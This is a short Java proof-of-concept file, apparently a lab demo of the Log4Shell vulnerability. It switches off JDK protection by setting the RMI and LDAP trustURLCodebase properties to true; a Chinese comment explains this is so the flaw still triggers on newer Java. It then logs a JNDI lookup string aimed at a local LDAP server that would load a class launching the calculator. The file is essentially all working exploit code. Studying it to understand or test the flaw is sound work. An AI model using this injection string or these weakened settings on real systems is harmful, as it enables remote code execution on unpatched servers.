import org.apache.logging.log4j.Logger;

import org.apache.logging.log4j.LogManager;

public class log4jrce {
    private  static final Logger logg = LogManager.getLogger();
    public static void  main(String[] args) {
        // 避免因为Java版本过高而无法触发此漏洞
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        logg.error("${jndi:ldap://127.0.0.1:1389/Basic/Command/calc}");

    }

}
